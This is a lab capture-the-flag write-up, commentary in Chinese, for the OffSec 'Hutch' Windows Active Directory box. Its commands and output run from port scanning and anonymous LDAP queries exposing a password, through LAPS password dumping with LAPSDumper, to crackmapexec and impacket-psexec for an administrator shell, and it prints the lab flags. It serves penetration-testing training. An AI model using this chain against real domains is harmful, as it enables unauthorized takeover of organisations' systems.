###### tags: `Offsec` `PG Practice` `Intermediate` `Windows`

# Hutch
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.190.122 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.190.122:53
Open 192.168.190.122:80
Open 192.168.190.122:88
Open 192.168.190.122:135
Open 192.168.190.122:139
Open 192.168.190.122:389
Open 192.168.190.122:445
Open 192.168.190.122:464
Open 192.168.190.122:593
Open 192.168.190.122:636
Open 192.168.190.122:3268
Open 192.168.190.122:3269
Open 192.168.190.122:5985
Open 192.168.190.122:9389
Open 192.168.190.122:49666
Open 192.168.190.122:49668
Open 192.168.190.122:49673
Open 192.168.190.122:49674
Open 192.168.190.122:49676
Open 192.168.190.122:49692

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-04-23 06:23:09Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

參考[389, 636, 3268, 3269 - Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)，可以得到domain為`hutch.offsec`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ nmap -n -sV --script "ldap* and not brute" 192.168.190.122

...
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=hutch,DC=offsec
...
```

所以再使用`ldapsearch`，裡面可得`密碼:CrabSharkJellyfish192`，`user:fmcsorley`
```
┌──(kali㉿kali)-[~/pgplay/windapsearch]
└─$ ldapsearch -x -H ldap://192.168.190.122 -D '' -w '' -b "DC=hutch,DC=offsec"

# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132489437036308102
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
```

參考[Local Administrator Password Solution (LAPS)](https://ttp.parzival.sh/pentesting/infrastructure/active-directory/local-administrator-password-solution-laps#retrieving-laps-passwords)這個網頁，下載他的工具，可得到`administator`的密碼為`pJDZwUE2}}4a!+`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ git clone https://github.com/n00py/LAPSDumper.git

┌──(kali㉿kali)-[~/pgplay/LAPSDumper]
└─$ python3 laps.py -u fmcsorley -p "CrabSharkJellyfish192" -d hutch.offsec
LAPS Dumper - Running at 04-23-2024 03:44:27
HUTCHDC pJDZwUE2}}4a!+
```

用cme看看
```
┌──(kali㉿kali)-[~/pgplay]
└─$ crackmapexec smb 192.168.190.122 -u administrator -p "pJDZwUE2}}4a\!+" --shares
SMB         192.168.190.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.190.122 445    HUTCHDC          [+] hutch.offsec\administrator:pJDZwUE2}}4a!+ (Pwn3d!)
SMB         192.168.190.122 445    HUTCHDC          [+] Enumerated shares
SMB         192.168.190.122 445    HUTCHDC          Share           Permissions     Remark
SMB         192.168.190.122 445    HUTCHDC          -----           -----------     ------
SMB         192.168.190.122 445    HUTCHDC          ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.190.122 445    HUTCHDC          C$              READ,WRITE      Default share
SMB         192.168.190.122 445    HUTCHDC          IPC$            READ            Remote IPC
SMB         192.168.190.122 445    HUTCHDC          NETLOGON        READ,WRITE      Logon server share 
SMB         192.168.190.122 445    HUTCHDC          SYSVOL          READ            Logon server share 
```

登入administrator，在`C:\Users\Administrator\Desktop`可得proof.txt，在`C:\Users\fmcsorley\Desktop`可得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ impacket-psexec administrator@192.168.190.122 
Password: pJDZwUE2}}4a!+

C:\Users\Administrator\Desktop> type proof.txt
17ae035a1d67b2f1cd218d7fe6cffdcf

C:\Users\fmcsorley\Desktop> type local.txt
0da8713489583af6f5bf1402b5f198e1
```